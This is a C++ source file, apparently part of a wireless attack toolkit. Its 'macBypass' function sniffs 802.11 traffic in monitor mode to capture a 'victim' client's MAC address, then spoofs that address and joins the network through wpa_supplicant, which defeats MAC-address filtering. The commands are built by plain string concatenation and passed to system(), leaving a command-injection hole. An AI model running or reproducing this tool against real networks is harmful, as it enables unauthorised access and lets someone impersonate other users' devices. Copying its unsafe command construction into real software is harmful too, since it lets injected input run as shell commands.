#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <fstream>

#include "tins/tins.h"
#include "Buffer/Packet_Buffer.hpp"

std::string data_wlan(Tins::Dot11Data *data_frame, Tins::HWAddress<6> mac_router) {
    auto mac_src = data_frame->addr2();
    auto mac_dst = data_frame->addr1();
    if (mac_dst.to_string() == "ff:ff:ff:ff:ff:ff" || mac_src.to_string() == "ff:ff:ff:ff:ff:ff")
        return "";
    if (mac_router == mac_src) {
        return mac_dst.to_string();
    } else if (mac_router == mac_dst) {
        return mac_src.to_string();
    }
    return "";
}

std::string process_packets(std::string iface, std::string mac) {
    auto packet_buffer = std::make_unique<Packet_buffer>(iface);
    packet_buffer->start_sniffing();

    auto start_time = std::chrono::system_clock::now();
    bool stop_loop = false;
    while (!stop_loop) {
        if (packet_buffer->queue_status()) {
            auto packet = packet_buffer->get_packet();

            try {
                auto pdu = packet.pdu();

                auto data_frame = pdu->find_pdu<Tins::Dot11Data>();
                if (data_frame != nullptr) {
                    auto return_string = data_wlan(data_frame, mac);
                    if (!return_string.empty())
                        return return_string;
                }
            }
            catch (...) {
                std::cout << "Error during paket interpretation" << std::endl;
            }
        }
        auto timestamp = std::chrono::system_clock::now();
        if (start_time + std::chrono::seconds(10) < timestamp)
            stop_loop = true;
    }
    return "";
}

//Need to check driver!
std::string macBypass(std::string mac_victim, bool router, std::string network_interface, std::string passphrase,
                      std::string ssid_tmp) {
    std::string ssid{}, mac{}, wpa_connect{};
    std::ofstream wpa_config_file;
    system(std::string("ip link set " + network_interface + " down").c_str());
    system(std::string("sudo iwconfig " + network_interface + " mode monitor").c_str());
    system(std::string("ip link set " + network_interface + " up").c_str());

    if (router) {
        mac = process_packets(network_interface, mac_victim);
        if (mac.empty())
            return "Could not find mac to spoof";
        ssid = ssid_tmp;
    } else {
        mac = mac_victim;
        ssid = ssid_tmp;
    }
    wpa_config_file.open("/etc/wpa_supplicant.conf");
    wpa_config_file << "network={\n\tssid=\"" + ssid + "\"\n\tpsk=\"" + passphrase + "\"\n}";
    wpa_config_file.close();
    system(std::string("ip link set " + network_interface + " down").c_str());
    system(std::string("sudo iwconfig " + network_interface + " mode managed").c_str());
    system(std::string("ifconfig " + network_interface + " hw ether " + mac + " up").c_str());
    system(("sudo wpa_supplicant -B -i" + network_interface + " -c/etc/wpa_supplicant.conf -Dwext " +
            network_interface).c_str());
    auto return_string = "Activate " + network_interface + " with new mac: " + mac;
    return return_string;
}